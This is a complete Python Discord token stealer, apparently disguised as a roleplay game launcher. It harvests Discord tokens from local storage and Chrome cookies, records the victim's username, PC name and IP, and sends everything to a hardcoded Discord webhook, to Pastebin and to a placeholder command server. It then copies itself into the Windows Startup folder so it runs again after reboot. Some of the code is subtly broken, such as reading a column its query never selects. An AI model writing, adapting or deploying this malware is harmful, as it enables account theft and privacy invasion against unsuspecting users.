import os
import sqlite3
import requests
import json
import glob
import shutil
import re

WEBHOOK = "https://discord.com/api/webhooks/1549675006970306560/ZizSzCiwDIKRmokuHx8lIUhud9csD0X_iZbzngCHdo50FgGO6-9ySegVN5bXDlqdfr7b"

def get_tokens():
    tokens = []
    paths = [
        os.path.expandvars(r"%APPDATA%\discord\Local Storage\https://discord.com_0.localstorage"),
        os.path.expandvars(r"%APPDATA%\discordptb\Local Storage\https://discord.com_0.localstorage"),
        os.path.expandvars(r"%APPDATA%\discord-canary\Local Storage\https://discord.com_0.localstorage"),
        os.path.expandvars(r"%LOCALAPPDATA%\discord\Local Storage\https://discord.com_0.localstorage"),
        os.path.expandvars(r"%LOCALAPPDATA%\discordptb\Local Storage\https://discord.com_0.localstorage"),
        os.path.expandvars(r"%LOCALAPPDATA%\discord-canary\Local Storage\https://discord.com_0.localstorage"),
    ]

    for db_path in paths:
        if os.path.exists(db_path):
            try:
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                cursor.execute("SELECT value FROM store WHERE key LIKE '%token%'")
                rows = cursor.fetchall()
                for row in rows:
                    if row[1] and len(str(row[1])) > 50:
                        tokens.append(str(row[1]))
                cursor.execute("SELECT key, value FROM store WHERE key LIKE '%session%'")
                rows = cursor.fetchall()
                for row in rows:
                    if row[1] and len(str(row[1])) > 50:
                        tokens.append(str(row[1]))
                conn.close()
            except:
                pass

    json_paths = glob.glob(os.path.expandvars(r"%APPDATA%\discord\Local Storage\https://discord.com\*"))
    for fpath in json_paths:
        try:
            with open(fpath, 'r', errors='ignore') as f:
                content = f.read()
                if '"token"' in content:
                    matches = re.findall(r'"token"\s*:\s*"([A-Za-z0-9_-]{50,})"', content)
                    tokens.extend(matches)
        except:
            pass

    chrome_cookies = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies")
    if os.path.exists(chrome_cookies):
        try:
            conn = sqlite3.connect(chrome_cookies)
            cursor = conn.cursor()
            cursor.execute("SELECT name, value FROM cookies WHERE name LIKE '%discord%'")
            rows = cursor.fetchall()
            for row in rows:
                tokens.append(row[1])
            conn.close()
        except:
            pass

    tokens = list(set(tokens))
    return tokens

def exfiltrate(tokens):
    if not tokens:
        return

    username = os.getenv('USERNAME', 'unknown')
    computer = os.getenv('COMPUTERNAME', 'unknown')
    try:
        ip = requests.get('http://ifconfig.me', timeout=5).text.strip()
    except:
        ip = 'unknown'

    output = f"=== Discord Token Stealer ===\nUser: {username}\nPC: {computer}\nIP: {ip}\nTokens:\n"
    for t in tokens:
        output += f"{t}\n"

    try:
        body = {
            "username": "Discord Logs",
            "embeds": [{
                "title": "New Victim",
                "color": 15158332,
                "fields": [
                    {"name": "User", "value": username, "inline": True},
                    {"name": "PC", "value": computer, "inline": True},
                    {"name": "Tokens", "value": len(tokens), "inline": True}
                ],
                "footer": {"text": "Token Stealer v2.0"}
            }]
        }
        requests.post(WEBHOOK, json=body, timeout=5)
    except:
        pass

    try:
        requests.post("https://pastebin.com/api/api_post.php", data={
            "api_option": "paste",
            "api_paste_code": output,
            "api_paste_name": f"tokens_{username}",
            "api_paste_format": "text",
            "api_paste_expire": "1D",
            "api_dev_key": "YOUR_PASTEBIN_KEY"
        }, timeout=5)
    except:
        pass

    try:
        requests.post("https://YOUR-C2-SERVER.com/collect", data=output, timeout=5)
    except:
        pass

    del tokens

def persist():
    startup = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\NOVA_RP_Launcher.py")
    if not os.path.exists(startup):
        try:
            shutil.copy2(__file__, startup)
        except:
            pass

if __name__ == "__main__":
    found_tokens = get_tokens()
    exfiltrate(found_tokens)
    persist()